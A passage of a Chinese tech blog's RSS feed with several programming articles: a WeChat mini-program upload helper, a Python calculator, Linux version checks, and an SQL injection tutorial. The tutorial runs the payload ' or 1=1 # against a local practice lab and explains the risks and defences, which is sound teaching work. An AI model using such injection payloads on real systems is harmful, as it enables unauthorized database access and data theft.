创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:54 +0000</pubDate>
    </item>
    <item>
      <title>微信小程序上传组件封装uploadHelper2.0使用整理</title>
      <link>https://www.ppmy.cn/news/1540418.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维微信小程序上传组件封装uploadHelper2.0使用整理news/2025/10/31 17:53:53/一、uploadHelper2.0使用步骤说明uploadHelper.js ---上传代码封装库cos-wx-sdk-v5.min.js---腾讯云，对象存储封装库第一步，下载组件代码，放置到自己的小程序项目中第二步、 创建上传对象，执行选择图片/视频var _this = this;//选择图片并上传var upload = new Upload(this, {type: 'single',onSuccess: res =&gt; {var relativeName = res.relativeName;_this.setData({src1: _this.data.domain + relativeName});}});upload.choose();第三步、.Net 后台安装 Uploader8.0 最新版本接受上传内容/*********Form 方式使用**********/public void Form(){try{FormReceiver _receive = new FormReceiver(this.HttpContext);//接收文件成功_receive.OnSuccess = (data) =&gt;{// Write(string.Format("新文件名{0},旧文件名{1}", data.NewName, data.OldName));};_receive.DoWork();}catch (Exception ex){throw ex;}}二、图片上传使用案例参数说明：/*** 上传控件封装，v2.0* 增加视频上传处理* * 上传类型：type* 1.single,不改变图片大小，但是压缩质量上传；适合大图上传* 2.imgsingle，不改变图片的比例，在指定范围内等比例缩放 （默认上传模式，适用高，压缩率高），最大尺寸，大图(maxWidth*maxHeight)* 3.fixedcut，固定比例缩放(maxWidth*maxHeight)，最大化图片剪切* 4.cutdouble，固定最小图(minWidth*minHeight)，最大图(maxWidth*maxHeight)，裁剪图片* 5.imgdouble，常用缩略图模式，不改变原图片的比例，在指定范围内等比例缩放，小图(minWidth*minHeight); 大图((maxWidth*maxHeight))* 7.videosingle, 视频压缩上传默认---chooseVideo()* 8.videotencent,视频腾讯云上传模式---chooseVideo()------（特别说明，视频目前进支持腾讯云上传）* * 参数说明：* url:上传地址* count: 可上传数量,最大值20* maxWidth，maxHeight:大图片上线* minWidth,minHeight: 小图上线* auto:是否自动上传* onSuccess:一张图片上传成功* onError:图片上传失败*/1.single 简单图片上传------如上代码案例就是2.imgsingle  案例不改变图片的比例，在指定范围内等比例缩放 （默认上传模式，适用高，压缩率高），最大尺寸，大图(maxWidth*maxHeight)&lt;button bind:tap="imgsingleClick"&gt;imgsingle 压缩上传上传
&lt;/button&gt;
&lt;image src="{{src2}}" mode="" /&gt;
&lt;view class="line"&gt;&lt;/view&gt;&lt;!-- 上传控件 --&gt;
&lt;view style='width:1px;height:1px;overflow:hidden;position: fixed;left:10000px;top:0px;'&gt;&lt;canvas id='CanvasUpload' type="2d" style='width:{{canWidth}}px;height:{{canHeight}}px;'&gt;&lt;/canvas&gt;
&lt;/view&gt;imgsingleClick() {var _this = this;//选择图片并上传var upload = new Upload(this, {type: 'imgsingle',maxWidth: 500,maxHeight: 500,onSuccess: res =&gt; {var relativeName = res.relativeName;_this.setData({src2: _this.data.domain + relativeName});}});upload.choose();},3.fixedcut 案例固定比例缩放(maxWidth*maxHeight)，最大化图片剪切fixedcutClick() {var _this = this;//选择图片并上传var upload = new Upload(this, {type: 'fixedcut',maxWidth: 500,maxHeight: 500,onSuccess: res =&gt; {var relativeName = res.relativeName;_this.setData({src3: _this.data.domain + relativeName});}});upload.choose();},4.cutdouble 案例固定最小图(minWidth*minHeight)，最大图(maxWidth*maxHeight)，裁剪图片cutdoubleClick() {var _this = this;var imgList=[];//选择图片并上传var upload = new Upload(this, {type: 'cutdouble',minWidth: 300,minHeight: 300,maxWidth: 1000,maxHeight: 1000,onSuccess: res =&gt; {console.info(res);var srcsmall = _this.data.domain + res.small.relativeName;var srcbig = _this.data.domain + res.big.relativeName;_this.setData({srcsmall: srcsmall,srcbig: srcbig});},onAllSuccess:res=&gt;{}});upload.choose();},5.imgdouble 缩略图案例常用缩略图模式，不改变原图片的比例，在指定范围内等比例缩放，小图(minWidth*minHeight); 大图((maxWidth*maxHeight))imgdoubleClick() {var _this = this;var imgList = [];//选择图片并上传var upload = new Upload(this, {type: 'imgdouble',minWidth: 300,minHeight: 300,maxWidth: 1000,maxHeight: 1000,onSuccess: res =&gt; {console.info(res);var srcsmall = _this.data.domain + res.small.relativeName;var srcbig = _this.data.domain + res.big.relativeName;_this.setData({srcsmall: srcsmall,srcbig: srcbig});},onAllSuccess: res =&gt; {}});upload.choose();},三、视频上传使用案例chooseVideo()1.videosingle  ---视频压缩切片上传（暂时没有封装，2.0版本忽略）2.videotencent 案例---视频腾讯云上传模式---chooseVideo()------（特别说明，视频目前进支持腾讯云上传）使用步骤：1. 小程序上传 白名单，添加配置 上传域名+ 视频播放域名2. 配置 腾讯云 对象存储参数如下3. 页面实现功能代码：&lt;button bind:tap="videotencentClick"&gt;选择视频文件&lt;/button&gt;&lt;video src="{{videourl}}" /&gt;videotencentClick() {var _this = this;/**** * 特别说明，暂时不支持视频上传到自建服务器*///选择图片并上传var upload = new Upload(this, {type: 'videotencent',onSuccess: res =&gt; {var videourl = res.absoluteName;_this.setData({videourl});},onAllSuccess: res =&gt; {}});upload.chooseVideo(); //选择视频},上传效果：更多：维信小程序禁止截屏/录屏微信小程序canvas 使用案例（一）微信小程序数组绑定使用案例（二）http://www.ppmy.cn/news/1540418.html相关文章Python案例小练习——小计算器文章目录 前言一、代码展示二、运行展示 前言 
这是用python实现一个简单的计器。 一、代码展示 
def calculate(num1, op, num2):if op  "":return float(num1)  float(num2)elif op  "-":return float(num1) - float(num2)elif op  "*":return…阅读更多...linux查看系统类型要确定系统是 Ubuntu 还是 CentOS&amp;#xff0c;可以通过查看系统的发行版信息来判断。以下是几种常见的方法&amp;#xff1a; 
方法一&amp;#xff1a;使用 cat 命令查看 /etc/os-release 文件 
这个文件包含了系统的详细信息&amp;#xff0c;包括发行版名称和版本号。 
cat /etc/os-release…阅读更多...SQL Injection | SQL 注入概述关注这个漏洞的其他相关笔记&amp;#xff1a;SQL 注入漏洞 - 学习手册-CSDN博客 0x01&amp;#xff1a;SQL 注入漏洞介绍 
SQL 注入就是指 Web 应用程序对用户输入数据的合法性没有判断&amp;#xff0c;前端传入后端的参数是可控的&amp;#xff0c;并且参数会带入到数据库中执行&amp;#xff0c;导致…阅读更多...【容易混淆】Nest模块内外及依赖注入Nest模块内外及依赖注入 从Module装饰器去考虑从模块内外考虑模块外如何注入容易混淆的点 在文档的 
Exception filters即异常过滤器的 
Binding filters一节中&amp;#xff0c;提到了 
全局绑定的两个方式&amp;#xff1a; // 第一种
filename(main)
async function bootstrap() {cons…阅读更多...SpringBoot实现桂林旅游的智能推荐3系统分析 3.1可行性分析 通过对本桂林旅游景点导游平台实行的目的初步调查和分析&amp;#xff0c;提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。 3.1.1技术可行性 本桂林旅游景点导游平台采用SSM框架&amp;#xff0c;JAVA作…阅读更多...Python 使用 Jarvis 算法或包装的凸包（Convex Hull using Jarvis’ Algorithm or Wrapping）给定平面中的一组点&amp;#xff0c;该集合的凸包是包含该集合所有点的最小凸多边形。 我们强烈建议您先阅读以下文章。  如何检查两个给定的线段是否相交&amp;#xff1f; 
c https://blog.csdn.net/hefeng_aspnet/article/details/141713655 java https://blog.csdn.net/hefeng_aspne…阅读更多...Docker systemdocker system --help 
siqialiyun-sh-001:~/images$ sudo docker system --helpUsage:  docker system COMMANDManage DockerCommands:df          Show docker disk usage(显示docker磁盘使用情况)events      Get real time events from the server(从服务器获取实时事件)in…阅读更多...(echarts)折线图初始渲染canvas特别窄问题(echarts)折线图初始渲染canvas特别窄问题 自行解决使用方法&amp;#xff1a; 
this.$nextTick(() &gt; {this.showView(this.queryId)
})解决后&amp;#xff1a;  搜索建议&amp;#xff1a;阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:53 +0000</pubDate>
    </item>
    <item>
      <title>Python案例小练习——小计算器</title>
      <link>https://www.ppmy.cn/news/1540417.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Python案例小练习——小计算器news/2025/10/31 17:53:52/文章目录前言一、代码展示二、运行展示前言这是用python实现一个简单的计器。一、代码展示defcalculate(num1,op,num2):ifop=="+":returnfloat(num1)+float(num2)elifop=="-":returnfloat(num1)-float(num2)elifop=="*":returnfloat(num1)*float(num2)elifop=="/":returnfloat(num1)/float(num2)elifop=="%":returnfloat(num1)%float(num2)elifop=="^":returnfloat(num1)**float(num2)elifop=="**":returnfloat(num1)**float(num2)print("*"*20)print(("欢迎使用计算器"))print("请输入需要计算的数字：")num1=input()print("请输入需要进行的计算：")op=input()print("请输入需要计算的数字：")num2=input()result=calculate(num1,op,num2)print(num1+" "+op+" "+num2+" = "+str(result))二、运行展示http://www.ppmy.cn/news/1540417.html相关文章linux查看系统类型要确定系统是 Ubuntu 还是 CentOS&amp;#xff0c;可以通过查看系统的发行版信息来判断。以下是几种常见的方法&amp;#xff1a; 
方法一&amp;#xff1a;使用 cat 命令查看 /etc/os-release 文件 
这个文件包含了系统的详细信息&amp;#xff0c;包括发行版名称和版本号。 
cat /etc/os-release…阅读更多...SQL Injection | SQL 注入概述关注这个漏洞的其他相关笔记&amp;#xff1a;SQL 注入漏洞 - 学习手册-CSDN博客 0x01&amp;#xff1a;SQL 注入漏洞介绍 
SQL 注入就是指 Web 应用程序对用户输入数据的合法性没有判断&amp;#xff0c;前端传入后端的参数是可控的&amp;#xff0c;并且参数会带入到数据库中执行&amp;#xff0c;导致…阅读更多...【容易混淆】Nest模块内外及依赖注入Nest模块内外及依赖注入 从Module装饰器去考虑从模块内外考虑模块外如何注入容易混淆的点 在文档的 
Exception filters即异常过滤器的 
Binding filters一节中&amp;#xff0c;提到了 
全局绑定的两个方式&amp;#xff1a; // 第一种
filename(main)
async function bootstrap() {cons…阅读更多...SpringBoot实现桂林旅游的智能推荐3系统分析 3.1可行性分析 通过对本桂林旅游景点导游平台实行的目的初步调查和分析&amp;#xff0c;提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。 3.1.1技术可行性 本桂林旅游景点导游平台采用SSM框架&amp;#xff0c;JAVA作…阅读更多...Python 使用 Jarvis 算法或包装的凸包（Convex Hull using Jarvis’ Algorithm or Wrapping）给定平面中的一组点&amp;#xff0c;该集合的凸包是包含该集合所有点的最小凸多边形。 我们强烈建议您先阅读以下文章。  如何检查两个给定的线段是否相交&amp;#xff1f; 
c https://blog.csdn.net/hefeng_aspnet/article/details/141713655 java https://blog.csdn.net/hefeng_aspne…阅读更多...Docker systemdocker system --help 
siqialiyun-sh-001:~/images$ sudo docker system --helpUsage:  docker system COMMANDManage DockerCommands:df          Show docker disk usage(显示docker磁盘使用情况)events      Get real time events from the server(从服务器获取实时事件)in…阅读更多...(echarts)折线图初始渲染canvas特别窄问题(echarts)折线图初始渲染canvas特别窄问题 自行解决使用方法&amp;#xff1a; 
this.$nextTick(() &gt; {this.showView(this.queryId)
})解决后&amp;#xff1a;  搜索建议&amp;#xff1a;阅读更多...R语言绘图——文本注释在R语言中&amp;#xff0c;文本注释通常用于向图形中添加注释或说明&amp;#xff0c;可以通过一些函数在图形上添加文字、标签等。以下是R中处理文本注释的常见函数和方法。 
0x01 text()函数 
一、常见语法 
text() 函数允许你在绘图的指定位置上添加文字注释。其常用语法如下&amp;#xf…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:52 +0000</pubDate>
    </item>
    <item>
      <title>linux查看系统类型</title>
      <link>https://www.ppmy.cn/news/1540416.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维linux查看系统类型news/2025/10/31 17:53:51/要确定系统是 Ubuntu 还是 CentOS，可以通过查看系统的发行版信息来判断。以下是几种常见的方法：方法一：使用cat命令查看/etc/os-release文件这个文件包含了系统的详细信息，包括发行版名称和版本号。cat /etc/os-release输出示例（Ubuntu）：NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.3 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal输出示例（CentOS）：NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"方法二：使用lsb_release命令lsb_release命令可以显示 Linux 标准基础（LSB）的信息。lsb_release -a输出示例（Ubuntu）：No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:        20.04
Codename:       focal输出示例（CentOS）：LSB Version:    :core-4.1-amd64:core-4.1-noarch
Distributor ID: CentOS
Description:    CentOS Linux release 7.9.2009 (Core)
Release:        7.9.2009
Codename:       Core方法三：查看/etc/issue文件这个文件通常包含系统的发行版信息。cat /etc/issue输出示例（Ubuntu）：Ubuntu 20.04.3 LTS \n \l输出示例（CentOS）：CentOS Linux release 7.9.2009 (Core)
Kernel \r on an \m方法四：使用hostnamectl命令hostnamectl命令可以显示系统的详细信息，包括操作系统名称和版本。hostnamectl输出示例（Ubuntu）：Static hostname: ubuntuIcon name: computer-vmChassis: vmMachine ID: 1234567890abcdef1234567890abcdefBoot ID: 1234567890abcdef1234567890abcdefVirtualization: kvmOperating System: Ubuntu 20.04.3 LTSKernel: Linux 5.4.0-80-genericArchitecture: x86-64输出示例（CentOS）：Static hostname: centosIcon name: computer-vmChassis: vmMachine ID: 1234567890abcdef1234567890abcdefBoot ID: 1234567890abcdef1234567890abcdefVirtualization: kvmOperating System: CentOS Linux 7 (Core)Kernel: Linux 3.10.0-1160.24.1.el7.x86_64Architecture: x86-64http://www.ppmy.cn/news/1540416.html相关文章SQL Injection | SQL 注入概述关注这个漏洞的其他相关笔记&amp;#xff1a;SQL 注入漏洞 - 学习手册-CSDN博客 0x01&amp;#xff1a;SQL 注入漏洞介绍 
SQL 注入就是指 Web 应用程序对用户输入数据的合法性没有判断&amp;#xff0c;前端传入后端的参数是可控的&amp;#xff0c;并且参数会带入到数据库中执行&amp;#xff0c;导致…阅读更多...【容易混淆】Nest模块内外及依赖注入Nest模块内外及依赖注入 从Module装饰器去考虑从模块内外考虑模块外如何注入容易混淆的点 在文档的 
Exception filters即异常过滤器的 
Binding filters一节中&amp;#xff0c;提到了 
全局绑定的两个方式&amp;#xff1a; // 第一种
filename(main)
async function bootstrap() {cons…阅读更多...SpringBoot实现桂林旅游的智能推荐3系统分析 3.1可行性分析 通过对本桂林旅游景点导游平台实行的目的初步调查和分析&amp;#xff0c;提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。 3.1.1技术可行性 本桂林旅游景点导游平台采用SSM框架&amp;#xff0c;JAVA作…阅读更多...Python 使用 Jarvis 算法或包装的凸包（Convex Hull using Jarvis’ Algorithm or Wrapping）给定平面中的一组点&amp;#xff0c;该集合的凸包是包含该集合所有点的最小凸多边形。 我们强烈建议您先阅读以下文章。  如何检查两个给定的线段是否相交&amp;#xff1f; 
c https://blog.csdn.net/hefeng_aspnet/article/details/141713655 java https://blog.csdn.net/hefeng_aspne…阅读更多...Docker systemdocker system --help 
siqialiyun-sh-001:~/images$ sudo docker system --helpUsage:  docker system COMMANDManage DockerCommands:df          Show docker disk usage(显示docker磁盘使用情况)events      Get real time events from the server(从服务器获取实时事件)in…阅读更多...(echarts)折线图初始渲染canvas特别窄问题(echarts)折线图初始渲染canvas特别窄问题 自行解决使用方法&amp;#xff1a; 
this.$nextTick(() &gt; {this.showView(this.queryId)
})解决后&amp;#xff1a;  搜索建议&amp;#xff1a;阅读更多...R语言绘图——文本注释在R语言中&amp;#xff0c;文本注释通常用于向图形中添加注释或说明&amp;#xff0c;可以通过一些函数在图形上添加文字、标签等。以下是R中处理文本注释的常见函数和方法。 
0x01 text()函数 
一、常见语法 
text() 函数允许你在绘图的指定位置上添加文字注释。其常用语法如下&amp;#xf…阅读更多...这种V带的无极变速能用在新能源汽车上吧？CVT的无极变速器的结构能用在电动汽车上吗&amp;#xff1f;阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:51 +0000</pubDate>
    </item>
    <item>
      <title>SQL Injection | SQL 注入概述</title>
      <link>https://www.ppmy.cn/news/1540415.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维SQL Injection | SQL 注入概述news/2025/10/31 17:53:50/关注这个漏洞的其他相关笔记：SQL 注入漏洞 - 学习手册-CSDN博客0x01：SQL 注入漏洞介绍SQL 注入就是指Web 应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是可控的，并且参数会带入到数据库中执行，导致攻击者可以通过构造不同的 SQL 语句来实现对数据库进行任意操作的一种攻击方式。0x0101：SQL 注入漏洞演示实验工具准备PHP 运行环境：phpstudy_x64_8.1.1.3.zip（Apache2.4.39 + PHP 5.6.9nts）实验环境：PIKACHU 靶场 - 字符型注入（get） =&gt; 参考：PIKACHU - 靶场笔记合集本次的实验环境，我们采用现成的 PIKACHU 靶场，PIKACHU 靶场的安装方法参考上面提供的链接，这里就不多说了，下面直接开始演示。输入下面的链接，访问实验环境：http://localhost/pikachu/vul/sqli/sqli_str.php靶场要求我们输入 username，该值是一个字符串类型的值，我们可以随便输入一些内容，进行测试：此时我们推测一下这个业务的查询逻辑，笔者以伪代码的形式表示出来了：// 获取用户输入的 name$username = $_GET['name'];// 将用户输入的 name 拼接进预定义的 SQL 语句中$sql = "select * from username where name='$username'";// 将 $sql 中的内容传递到后端数据库执行，并获取结果$result = exec_sql($db_connect, $sql);// 如果查询到结果，则返回 “欢迎”，否则返回 “您输入的用户不存在”if ($result == True) {// 成功查询到用户信息echo "欢迎你" . $username;} else {echo "您输入的用户不存在";}在上面假设的业务逻辑中，代码未对用户传递的数据做任何的过滤就直接拼接到了 SQL 语句中，并传递给了后端，因此会造成 SQL 注入漏洞：测试 Payload: ' or 1=1 #'​后端实际执行的的 Payload: select * from username where name='' or 1=1 #''如上，我们通过传入 SQL 语句，尝试与服务器后端的查询语句拼接，成功让服务端返回了数据库中的所有内容。除了让服务端直接爆出数据库内容，我们还可以尝试去读取目标数据库中更多的内容，甚至通过 MySQL 往目标服务器写入木马程序，进而控制整个服务器。当然，这都是后话，上面主要就是简单演示一下 SQL 注入的攻击思路和危害，更进一步的内容，笔者后面会出单期讲。0x02：SQL 注入漏洞详解0x0201：SQL 注入漏洞产生的条件SQL 注入漏洞的产生需要满足以下两个条件：参数用户可控：前端传给后端的参数内容是用户可以控制的。参数带入数据库执行：传入的参数拼接到 SQL 语句中，且被带入数据库进行执行。0x0202：SQL 注入通常出现的位置一般的 Web 应用程序都是由 “视图层 + 业务逻辑层 + 数据访问层” 构成的，如下图所示：我们以一个简单的登录操作，讲解一下上图的流程：用户通过浏览器访问京东的首页，进入了登录页面。用户在视图层，输入了自己的账号和密码，浏览器将用户输入的账号密码通过某种方式传递到服务器的业务逻辑层，然后业务逻辑层将拿到的账号密码到数据库中进行匹配，如果匹配成功，则返回登录后的界面，否则返回登录失败的提示。SQL 注入发生的位置，其实就是执行 SQL 语句的位置。在上面的流程中，就是业务逻辑层将拿到的账号和密码到数据库中进行匹配的地方（如果用户输入正常的账号信息，则无问题，但是如果用户传递过来的是 SQL 语句呢？）。总的来说，所有可能与后端数据库发生交互的地方，都有可能出现 SQL 注入漏洞。0x0203：SQL 注入漏洞产生的危害未经授权的数据访问：攻击者可以利用 SQL 注入漏洞，无需授权即可访问数据库中的数据，从而窃取用户数据，如用户凭证、个人信息或业务数据，导致用户信息泄露。数据篡改：攻击者可以修改数据库中的数据，导致数据的完整性受损。这可能导致数据不一致，对业务流程和决策产生负面影响。数据库被恶意操作：攻击者可以对数据库进行增加或删除操作，例如删除数据库中重要数据的表，或篡改数据库的系统管理员账户。.服务器被远程控制：攻击者可能获取服务器的最高权限，远程控制服务器，安装后门，从而修改或控制操作系统。此外，他们还可能破坏硬盘数据，导致整个系统瘫痪。网站被挂马，传播恶意软件：攻击者可以修改数据库中的一些字段值，嵌入网马链接，进行挂马攻击，或者用来传播恶意软件。影响业务运营：SQL 注入攻击可能导致业务中断，降低用户信任度，损害品牌声誉，甚至带来法律责任。0x0204：SQL 注入漏洞的防范措施使用参数化查询或预编译语句，而不是直接拼接 SQL 语句。对用户输入进行严格的验证和过滤，防止恶意输入。使用最小权限原则，为数据库账户分配必要的权限。定期更新和修补数据库管理系统和应用程序的漏洞。使用 Web 应用防火墙（WAF）等安全设备，增强对 SQL 注入攻击的防御能力。0x03：参考资料《Web 安全攻防：渗透测试实战指南》 ISBN 978-7-121-34283-7http://www.ppmy.cn/news/1540415.html相关文章【容易混淆】Nest模块内外及依赖注入Nest模块内外及依赖注入 从Module装饰器去考虑从模块内外考虑模块外如何注入容易混淆的点 在文档的 
Exception filters即异常过滤器的 
Binding filters一节中&amp;#xff0c;提到了 
全局绑定的两个方式&amp;#xff1a; // 第一种
filename(main)
async function bootstrap() {cons…阅读更多...SpringBoot实现桂林旅游的智能推荐3系统分析 3.1可行性分析 通过对本桂林旅游景点导游平台实行的目的初步调查和分析&amp;#xff0c;提出可行性方案并对其一一进行论证。我们在这里主要从技术可行性、经济可行性、操作可行性等方面进行分析。 3.1.1技术可行性 本桂林旅游景点导游平台采用SSM框架&amp;#xff0c;JAVA作…阅读更多...Python 使用 Jarvis 算法或包装的凸包（Convex Hull using Jarvis’ Algorithm or Wrapping）给定平面中的一组点&amp;#xff0c;该集合的凸包是包含该集合所有点的最小凸多边形。 我们强烈建议您先阅读以下文章。  如何检查两个给定的线段是否相交&amp;#xff1f; 
c https://blog.csdn.net/hefeng_aspnet/article/details/141713655 java https://blog.csdn.net/hefeng_aspne…阅读更多...Docker systemdocker system --help 
siqialiyun-sh-001:~/images$ sudo docker system --helpUsage:  docker system COMMANDManage DockerCommands:df          Show docker disk usage(显示docker磁盘使用情况)events      Get real time events from the server(从服务器获取实时事件)in…阅读更多...(echarts)折线图初始渲染canvas特别窄问题(echarts)折线图初始渲染canvas特别窄问题 自行解决使用方法&amp;#xff1a; 
this.$nextTick(() &gt; {this.showView(this.queryId)
})解决后&amp;#xff1a;  搜索建议&amp;#xff1a;阅读更多...R语言绘图——文本注释在R语言中&amp;#xff0c;文本注释通常用于向图形中添加注释或说明&amp;#xff0c;可以通过一些函数在图形上添加文字、标签等。以下是R中处理文本注释的常见函数和方法。 
0x01 text()函数 
一、常见语法 
text() 函数允许你在绘图的指定位置上添加文字注释。其常用语法如下&amp;#xf…阅读更多...这种V带的无极变速能用在新能源汽车上吧？CVT的无极变速器的结构能用在电动汽车上吗&amp;#xff1f;阅读更多...[机器视觉]basler相机使用SN编号打开相机和采集背景分析 
在项目中是用basler相机采图时&amp;#xff0c;一般用的比较多的遍历相机&amp;#xff0c;然后使用CreateFirstDevice这个函数获取相机&amp;#xff0c;有些时候可能需要同时连接多个相机&amp;#xff0c;这里一般是遍历后&amp;#xff0c;再循环打开相机&amp;#xff0c;根据打开相机的SN号确…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:50 +0000</pubDate>
    </item>
    <item>
      <title>【容易混淆】Nest模块内外及依赖注入</title>
      <link>https://www.ppmy.cn/news/1540414.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【容易混淆】Nest模块内外及依赖注入news/2025/10/31 17:53:49/Nest模块内外及依赖注入从@Module装饰器去考虑从模块内外考虑模块外如何注入容易混淆的点在文档的Exception filters即异常过滤器的Binding filters一节中，提到了全局绑定的两个方式：// 第一种@@filename(main)asyncfunctionbootstrap(){constapp=awaitNestFactory.create(AppModule);app.useGlobalFilters(newHttpExceptionFilter());awaitapp.listen(3000);}bootstrap();// 第二种@@filename(app.module)import{Module}from'@nestjs/common';import{APP_FILTER}from'@nestjs/core';@Module({providers:[{provide:APP_FILTER,useClass:HttpExceptionFilter,},],})exportclassAppModule{}在文档中提到第一种方式无法注入依赖项，怎么去理解？从@Module装饰器去考虑首先要理解依赖注入的流程，分为两步：第一步是在构造函数中传入依赖项，代码如下：@Catch()exportclassHttpExceptionFilterimplementsExceptionFilter{constructor(privatereadonlylogger:LoggerService){}}// 